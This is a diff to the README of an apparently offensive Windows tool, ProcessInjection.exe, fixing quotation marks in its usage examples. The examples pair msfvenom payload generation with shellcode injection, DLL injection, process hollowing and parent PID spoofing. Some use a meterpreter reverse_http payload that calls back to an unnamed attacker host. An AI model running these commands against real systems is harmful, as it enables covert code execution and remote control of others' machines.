@@ -20,31 +20,31 @@ Currently the program accepts shellcode in 3 formats
 ### Command Line Usage
 
 	Generating shellcode in base64 format and injecting it in the target process.
-	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" | base64
-	ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:base64 /t:1
+	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" | base64
+	ProcessInjection.exe /pid:123 /path:"C:\Users\User\Desktop\shellcode.txt" /f:base64 /t:1
 
 	Generating shellcode in hex format and injecting it in the target process.
-	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f hex
-	ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:hex /t:1
+	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" -f hex
+	ProcessInjection.exe /pid:123 /path:"C:\Users\User\Desktop\shellcode.txt" /f:hex /t:1
 
 	Generating shellcode in c format and injecting it in the target process.
-	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f c
-	ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:1
+	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" -f c
+	ProcessInjection.exe /pid:123 /path:"C:\Users\User\Desktop\shellcode.txt" /f:c /t:1
 
 	DLL Injection
 	Generating DLL and injecting it in the target process.
-	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f dll > Desktop/calc.dll
-	ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\calc.dll"" /t:2
+	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" -f dll > Desktop/calc.dll
+	ProcessInjection.exe /pid:123 /path:"C:\Users\User\Desktop\calc.dll" /t:2
 	
 	Process Hollowing
 	Generating shellcode in c format and injecting it in the target process.
 	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
-	ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:3
+	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:""C:\Users\User\Desktop\shellcode.txt" /f:c /t:3
 	
 	Parent PID Spoofing
 	Generating shellcode in c format and injecting it in the target process.
-	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
-	ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /parentproc:explorer /f:c /t:4
+	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
+	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\shellcode.txt" /parentproc:explorer /f:c /t:4
 
 
 ### Blog Post
